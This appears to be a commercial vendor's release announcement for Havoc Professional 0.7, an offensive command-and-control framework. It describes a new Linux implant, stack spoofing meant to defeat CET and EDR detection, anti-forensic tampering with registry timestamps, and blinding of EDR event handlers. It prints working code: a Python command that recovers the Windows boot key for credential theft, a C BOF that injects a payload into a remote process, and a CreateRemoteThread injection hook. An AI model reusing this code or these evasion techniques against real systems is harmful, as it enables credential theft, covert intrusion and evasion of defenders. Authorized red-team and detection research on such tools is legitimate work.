# https://www.infinitycurve.org/blog/k-noir

[Havoc Professional](https://www.infinitycurve.org/blog/tag/havoc%20professional) [Kaine-kit](https://www.infinitycurve.org/blog/tag/kaine-kit) [Linux](https://www.infinitycurve.org/blog/tag/linux) [Stack Spoofing](https://www.infinitycurve.org/blog/tag/stack%20spoofing)

# Havoc Professional 0.7: K-Noir

An introduction to Havoc Professional 0.7 K-Noir, featuring a new Linux implant for x86\_64 and AArch64, CET compliant stack spoofing and rules systems, new Direct and P2P communication channels, new memory allocation and thread injection techniques, and much more.

![Paul Ungur](https://www.infinitycurve.org/_next/image?url=%2Fimages%2FPaul.png&w=48&q=75)Paul Ungur

June 5, 2026

![Havoc Professional 0.7: K-Noir](https://www.infinitycurve.org/_next/image?url=%2Fimages%2Fblog%2Fk-noir%2Fbanner.png&w=3840&q=75)

Since our last release we have been working on numerous new features, fixed bugs and feedback reported by our customers while improving the overall quality of life of the framework and it's kaine-kit. We are excited to announce new capabilities and an entire new implant for linux based systems targeting architectures such as x86\_64 and AArch64, reworking the stack spoofing capabilities to introduce compliance with Intel's CET Shadow Stack protection, alongside a rule system for fine-grained stack spoofing configuration, introducing new TCP based channels for direct and P2P communication while also adding new memory allocation and thread injection techniques.

## Expanding the (Linux) Arsenal

In the past few months, we have been working on making the kaine-kit work across platforms such as Linux on architectures such as x86\_64 and AArch64. This marks a key milestone toward supporting additional platforms, including macOS, which is on our roadmap with a planned release by Q4 of this year.

![Callstack Rules](https://www.infinitycurve.org/images/blog/k-noir/preview.png)

This release introduces the Linux implant with native features which are commonly used while having a foothold on a Unix-based system, such as:

- **Network Tunneling**: Native support for SOCKS4a/5 proxying and reverse port forwarding
- **Dynamic Code Execution**: The Linux implant supports the execution of ELF object files with a familiar BOF API
- **Guardrails**: Restrict payloads to run on specific, whitelisted systems only
- **Cross-Platform Linking**: Cross-platform P2P linking across supported and custom communication channels
- **Evasion Capabilities**: OS-specific, tailored evasion capabilities to hinder payload detection
- **User Interaction Support**: Out-of-the-box support for filesystem interaction and process management via the File Browser and Process Explorer

We focused on delivering a fully functional Linux implant with features that enable our customers to hit their operational targets.

## Stack Spoofing: Function Callstack Rules

This release comes with major improvements to the existing callstack spoofing extension by introducing a new rule system, allowing operators to specifically craft a callstack when invoking Win32 APIs that require a legitimate-looking callstack fitting the API context.

![Callstack Rules](https://www.infinitycurve.org/images/blog/k-noir/callstack-options.png)

In the previous version, all function calls would go through the callstack spoofing extension and impersonate a single callstack that looked identical across all function calls. In some scenarios this appeared suspicious, as certain APIs would not naturally produce that specific callstack. The rule system allows for numerous filters to target either all API calls from a module or a single function from a module, each impersonating a context-appropriate callstack.

For example, a rule targeting `WriteFile` can be configured to impersonate a callstack consistent with legitimate file I/O activity, while a separate rule for `NtCreateThreadEx` impersonates a thread creation context, ensuring each API call blends into its expected execution environment.

## Stack Spoofing: CET Compliance

While reworking the stack spoofing extension, we have added additional compatibility support for Intel's Control-flow Enforcement Technology (CET) which is known to protect against control flow hijacking and or techniques used by most common stack spoofing techniques.

![CET Compliant Stack Spoof](https://www.infinitycurve.org/images/blog/k-noir/callstack-cet.png)

Introducing this capability we also improved known detection rules targeting stack spoofing and the use of certain gadgets. As the detection landscape evolves, we remain committed to staying ahead of emerging mechanisms and ensuring our capabilities hold up against modern defensive tooling.

## Native Registry Manipulation Extension

A new extension we have developed is the Registry Manipulation Extension, allowing operators to interact with and manipulate both local and remote registry keys and values, with anti-forensic techniques available across all operations.

![Native Registry Extension](https://www.infinitycurve.org/images/blog/k-noir/registry-extension.png)

It supports the creation, querying, deletion, and time-stomping of keys and values via either the agent console or the Registry Extension Python API. The extension also exposes the ability to tamper with the last-written timestamp of registry keys, reverting it to either a specific value or the timestamp recorded before the operation was performed, leaving minimal trace of activity.

![Booktkey Extract](https://www.infinitycurve.org/images/blog/k-noir/bootkey-extract.png)

The screenshot above demonstrates one practical use of the Python API: querying known key locations to recover the bootkey from the hidden class name of the registry, directly from the session running on the target device. The full extraction script is available below:

```
@KnRegisterCommand(
    command     = 'bootkey',
    description = 'Extract the Windows boot key from SYSTEM\\CurrentControlSet\\Control\\Lsa',
    group       = 'Credential Commands',
    platform    = 'Windows' )
class BootKeyCommand(HcKaineCommand):

    def __init__(self, *args, **kwargs):
        #
        # Permutation matrix for descrambling the boot key
        self._BOOTKEY_PBOX = [\
            0x8, 0x5, 0x4, 0x2,\
            0xB, 0x9, 0xD, 0x3,\
            0x0, 0x6, 0x1, 0xC,\
            0xE, 0xA, 0xF, 0x7\
        ]

        self.LSA_BASE = r'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa'

        #
        # the four subkeys whose class attribute holds
        # the scrambled boot key parts
        self.BOOTKEY_SUBKEYS = ['JD', 'Skew1', 'GBG', 'Data']

        super().__init__( *args, **kwargs )

    @staticmethod
    def arguments(parser):
        parser.add_argument(
            '--hostname', '-H',
            default=None,
            help='Remote hostname to query (default: local machine)'
        )
        parser.add_argument(
            '--wow64',
            type=int,
            default=None,
            help='WOW64 flag for registry access'
        )

    async def execute( self, args ):
        registry = self.agent().command( 'registry' )
        hostname = getattr( args, 'hostname', None )
        wow64    = getattr( args, 'wow64', None )

        self.log_info( 'tasking to extract windows boot key...' )

        #
        # Query all four LSA subkeys concurrently.
        queries = [\
            registry.reg_query(\
                key_hive   = f'{self.LSA_BASE}\\{subkey}',\
                hostname   = hostname,\
                flag_wow64 = wow64,\
            )\
            for subkey in self.BOOTKEY_SUBKEYS\
        ]

        results = await asyncio.gather(*queries, return_exceptions=True)

        #
        # collect the Class attribute from each result
        parts = []
        for subkey_name, result in zip( self.BOOTKEY_SUBKEYS, results ):
            if isinstance( result, Exception ):
                self.log_error( f'failed to query {subkey_name}: {result}' )
                return

            class_val = result.get( 'class name' )

            parts.append( class_val )

        scrambled_hex = ''.join( parts )

        if len( scrambled_hex ) != 32:
            self.log_error(
                f'Expected 32 hex chars for scrambled boot key, '
                f'got {len(scrambled_hex)}: {scrambled_hex!r}'
            )
            return

        bootkey = self._descramble_bootkey( scrambled_hex )

        self.log_success( f'boot key: {bootkey.hex()}' )

        return

    def _descramble_bootkey( self, key: str ) -> bytes:
        """
        Parses the 128-bit binary boot key from a hex string
        and reverses the bytewise scrambling transform.
        """
        binkey = bytes.fromhex( key )
        return bytes( [ binkey[ i ] for i in self._BOOTKEY_PBOX ] )
```

## Python Debug Server

A significant quality-of-life improvement coming to this release is the built-in Python Debug Server, allowing operators to attach a debugger directly to their scripts running within the client, streamlining the development and troubleshooting of extension scripts without leaving the environment.

![Debugging Scripts](https://www.infinitycurve.org/images/blog/k-noir/debugging-scripts.png)

## Inject Kit Capability

For a while it has been possible to utilize custom injection techniques via the Inject-kit. The Inject-Kit exposes two primary decorator APIs for registering custom injection techniques:

- `KnRegisterInjectExplicitTask` \- Used to generate a task for explicit process injection (injecting into existing processes)
- `KnRegisterInjectSpawnTask` \- Used to generate a task for fork-and-run injection (spawning new processes and injecting into them)

> Custom injection techniques can be implemented using any execution method as beacon object files, extension features, or any other alternative execution mechanism as long as the function returns a valid HcKaineTask object that allows the calling function script to invoke it and/or issue the task. The Inject-Kit handles argument packing and task creation, while the registered function implements the actual injection logic.

The example implementation python script to register an explicit injection technique:

```
from pyhavoc.agent import *
from os.path       import *

@KnRegisterInjectExplicit( 'Basic', 'Description of basic injection technique (this one will just use the default injection technique from the agent)' )
def inject_explicit_basic( **kwargs ) -> HcKaineTask:
    agent         = kwargs[ 'agent' ]
    process       = kwargs[ 'process' ]
    payload       = kwargs[ 'payload' ]
    argument      = kwargs[ 'argument' ]
    offset        = kwargs[ 'offset' ]
    arch          = kwargs[ 'arch' ]
    single_memory = kwargs[ 'single_memory' ]
    track_memory  = kwargs[ 'track_memory' ]
    ignore_token  = kwargs[ 'ignore_token' ]
    task_wait     = kwargs[ 'task_wait' ]

    return agent.object_execute(
        f"{dirname( __file__ )}/bin/inject-explicit.{agent.agent_meta()['arch']}.obj",
        'go' + arch,
        object_argv = bof_pack( 'iibb', process, offset, payload, argument ),

        task_wait = task_wait
    )
```

With the corresponding BOF implementation:

```
#include <windows.h>
#include "beacon.h"

/* is this an x64 BOF */
BOOL is_x64() {
#if defined _M_X64
    return TRUE;
#elif defined _M_IX86
    return FALSE;
#endif
}

/* is this a 64-bit or 32-bit process? */
BOOL is_wow64(HANDLE process) {
    BOOL bIsWow64 = FALSE;

    if (!IsWow64Process(process, &bIsWow64)) {
        return FALSE;
    }

    return bIsWow64;
}

/* check if a process is x64 or not */
BOOL is_x64_process(HANDLE process) {
    if (is_x64() || is_wow64(GetCurrentProcess())) {
        return !is_wow64(process);
    }

    return FALSE;
}

void go(char* args, int len, BOOL x86) {
    HANDLE hProcess;
    datap  parser;
    int    pid;
    int    offset;
    char*  dllPtr;
    int    dllLen;
    char*  argPtr;
    int    argLen;

    /* Extract the arguments */
    BeaconDataParse(&parser, args, len);
    pid    = BeaconDataInt(&parser);
    offset = BeaconDataInt(&parser);
    dllPtr = BeaconDataExtract(&parser, &dllLen);
    argPtr = BeaconDataExtract(&parser, &argLen);

    /* Open a handle to the process, for injection. */
    hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        FALSE,
        pid);

    if (hProcess == INVALID_HANDLE_VALUE || hProcess == 0) {
        BeaconPrintf(CALLBACK_ERROR, "Unable to open process %d : %d", pid, GetLastError());
        return;
    }

    /* Check that we can inject the content into the process. */
    if (!is_x64_process(hProcess) && x86 == FALSE) {
        BeaconPrintf(CALLBACK_ERROR, "%d is an x86 process (can't inject x64 content)", pid);
        return;
    }
    if (is_x64_process(hProcess) && x86 == TRUE) {
        BeaconPrintf(CALLBACK_ERROR, "%d is an x64 process (can't inject x86 content)", pid);
        return;
    }

    /* inject into the process */
    BeaconInjectProcess(hProcess, pid, dllPtr, dllLen, offset, argPtr, argLen);

    BeaconPrintf(CALLBACK_OUTPUT, "injected payload into %d via inject-kit", pid);

    /* Clean up */
    CloseHandle(hProcess);
}

extern "C" void gox86(char* args, int alen) {
    go(args, alen, TRUE);
}

extern "C" void gox64(char* args, int alen) {
    go(args, alen, FALSE);
}
```

This example uses `BeaconInjectProcess`, which leverages the agent's embedded and configured injection technique.

![Injection Technique via BOF](https://www.infinitycurve.org/images/blog/k-noir/inject-kit-bof.png)

But this is not the only way to register injection techniques, via the payload generation the operators can register individual injection primitives at the payload generation level, splitting memory allocation, memory writing, and thread creation into separate composable components. This makes it straightforward to swap out behavior at any step of the injection pipeline without replacing the entire technique.

This API allows registering agent-wide thread creation and memory manipulation primitives used for injection by Beacon Object Files and injection-based features such as PowerSafe, Dotnet Execution, and the inject or spawn commands.

The `KnRegisterInjectExplicitExtension` decorator registers a custom thread creation technique. The registered function receives a context object, either an HcKaine agent instance or a dictionary, and must return the raw shellcode bytes of the thread creation primitive.

```
from pyhavoc.agent import *
from os.path       import *

@KnRegisterInjectExplicitExtension( 'CreateRemoteThread', 'Using CreateRemoteThread to execute an arbitrary pointer in the remote process' )
def inject_thread_createremotethread( context ) -> bytes:
    arch = context.agent_meta()[ 'arch' ] if isinstance( context, HcKaine ) else context[ 'arch' ]

    with open( f'{dirname( __file__ )}/bin/inject-createremotethread.{arch}.bin', 'rb' ) as f:
        return f.read()
```

![Injection Technique via Extension](https://www.infinitycurve.org/images/blog/k-noir/inject-kit-ext.png)

The selected primitives will be used when ever the injection logic is being invoked, be it either via an Beacon Object File calling `BeaconInjectProcess`/`BeaconInjectTemporaryProcess` and or while utilizing the inject command via the agent console.

## Reflecting User Interaction Tasks

Every action performed by an operator on an agent session is logged to a JSON file, but we received feedback requesting that actions performed via UI widgets such as the File Browser and Process Explorer also be reflected in the agent console, giving teammates clearer visibility into what is being done during a session. This is a small but welcome quality-of-life improvement.

![Reflecting User Interaction](https://www.infinitycurve.org/images/blog/k-noir/reflecting-to-console.png)

## Additional Improvements/Features and Private Customer Slack

In addition to the features covered above, we made numerous smaller additions and improvements to the Havoc Professional framework and the Kaine Kit, including:

- Added new configuration settings to limit console history for client
- Stack spoofing is now covered throughout the entire implant early runtime as well.
- Improved DNS based communication stability and speed
- Add TCP for direct communication for both Windows and Linux payloads
- Add TCP for P2P communication for both Windows and Linux payloads
- The session table now displays when ever payload protocol or configuration is interactive
- Added new memory allocation techniques for BOF execution and remote payload injection (via Inject-kit)
- Added new novel injection techniques for remote payload injection (via Inject-kit)
- New native extension for blinding or unregistering known EDR event handlers

On Windows-based systems, newly added TCP channels utilize the currently registered and applied sleep obfuscation technique while waiting for incoming tasks from either the parent link or direct listener communication. This ensures that they remain semi-interactive while also being concealed in memory when no tasks are queued.

We have opened a private customer Slack channel to enable more direct communication with our customers instead of previous communication channels such as Discord and Emails. Existing customers will receive an invite in the coming days.

## Our Philosophy and Roadmap

This release, rolling out early next week, marks a major milestone in closing out goals on our roadmap. Our philosophy is to maintain a stable and modular framework that fits every operator's use case and goals, while continuously improving the quality and usability of our products. We have resolved numerous issues reported by customers, improving the stability of existing features and expanding our capabilities to better serve their operational needs.

Looking ahead, we have a number of new features in planning and development, alongside work to bring full cross-platform support with macOS expected in the coming months, and continued R&D investment into novel evasion techniques and capabilities. In the coming weeks specifically, we will be releasing improvements to Firebeam VM, additional communication channels, and additional evasion capabilities.

If your organization is interested in acquiring Havoc Professional licenses, [contact us](https://www.infinitycurve.org/contact-us).